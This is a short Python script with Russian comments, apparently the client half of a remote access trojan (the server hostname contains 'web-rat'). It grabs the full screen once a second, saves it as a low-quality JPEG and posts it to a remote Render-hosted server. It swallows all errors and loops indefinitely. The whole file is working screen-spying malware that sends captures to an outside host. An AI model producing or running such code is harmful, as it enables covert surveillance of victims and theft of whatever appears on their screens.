import mss, requests, time, threading
from PIL import Image

# Твой адрес Render
SERVER_URL = 'https://web-rat-ab1r.onrender.com'

def send_screen():
    with mss.mss() as sct:
        monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
        while True:
            try:
                img = sct.grab(monitor)
                frame = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                frame.save("temp.jpg", "JPEG", quality=30)
                with open("temp.jpg", "rb") as f:
                    requests.post(f"{SERVER_URL}/upload_screen", files={'file': f}, timeout=5)
            except:
                pass
            time.sleep(1) # Отправляем скриншот раз в секунду

if __name__ == '__main__':
    print("[*] Мониторинг...")
    send_screen()
